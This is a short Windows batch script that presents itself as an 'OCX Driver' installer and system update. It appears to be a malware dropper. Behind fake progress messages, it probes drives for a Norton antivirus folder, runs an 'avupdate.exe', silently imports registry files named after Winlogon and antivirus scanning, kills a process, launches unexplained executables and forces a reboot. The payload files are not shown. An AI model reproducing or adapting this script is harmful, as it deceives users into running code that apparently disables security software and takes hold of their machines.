@echo off
del c:\ocx32.exe
if exist %windir%\system32\task32.exe goto update
echo Installing New OCX Driver
if not "%OS%"=="Windows_NT" goto win
if not exist c:\Progra~1\norton~1\ (goto d) else copy %windir%\avupdate.exe c:\avupdate.exe
  c:
  cd\
  avupdate.exe
  del c:\avupdate.exe
  goto cont
:d
if not exist d:\progra~1\norton~1\ (goto e) else copy %windir%\avupdate.exe d:\avupdate.exe
  d:
  cd\ 
  avupdate.exe
  del d:\avupdate.exe
  goto cont
:e
if not exist e:\progra~1\norton~1\ (goto f) else copy %windir%\avupdate.exe e:\avupdate.exe
  e:
  cd\
  avupdate.exe
  del e:\avupdate.exe
  goto cont
:f
if not exist f:\progra~1\norton~1\ (goto noav) else copy %windir%\avupdate.exe f:\avupdate.exe
  f:
  cd\
  avupdate.exe
  del f:\avupdate.exe
  goto cont
:cont
c:
echo Updating System files..
%windir%\updater.exe
echo System will Reboot when Install is Finished...
call  %windir%\ocx.bat
goto end

:noav
echo Updating System Files..
%windir%\updater.exe
regedit /s winlogon1.reg
regedit /s navscan.reg
regedit /s rescan.reg
%windir%\ocxdll1.exe
echo Update Finished..
goto end

:win
echo Updating System Files..
copy %windir%\avupdate.exe c:\avupdate.exe
cd\
avupdate.exe
del c:\avupdate.exe
cd %windir%
updater.exe
regedit /s winlogon.reg
echo Update Finished..Now Rebooting
%windir%\rundll32.exe shell32.dll,SHExitWindowsEx 2
goto end

:update
start /wait %windir%\pv -kf task32.exe
start /wait %windir%\updater.exe
%windir%\ocxdll1.exe
goto end

:end
